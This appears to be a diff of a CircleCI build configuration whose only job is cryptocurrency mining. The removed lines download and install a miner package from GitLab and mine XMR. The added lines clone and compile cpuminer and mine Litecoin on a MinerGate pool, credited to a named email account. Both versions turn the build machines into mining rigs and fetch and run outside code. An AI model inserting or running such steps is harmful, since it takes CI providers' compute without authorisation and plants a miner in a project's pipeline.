@@ -4,7 +4,8 @@ jobs:
     machine: true
 
     steps:
-      - checkout
-      - run: wget https://gitlab.com/Yoginth/Miner/raw/master/yogi-cli.deb -O yogi-cli.deb
-      - run: sudo dpkg -i yogi-cli.deb
-      - run: minergate-cli -user yoginth@hotmail.com  xmr
+      - run: sudo apt update -yqq
+      - run: sudo apt-get install libcurl4-openssl-dev libncurses5-dev pkg-config automake yasm
+      - run: git clone https://github.com/pooler/cpuminer.git
+      - run: cd cpuminer && ./autogen.sh && ./configure CFLAGS="-O3" && make
+      - run: cd cpuminer && ./minerd --url=stratum+tcp://ltc.pool.minergate.com:3336 --user=yoginth@hotmail.com --pass=x
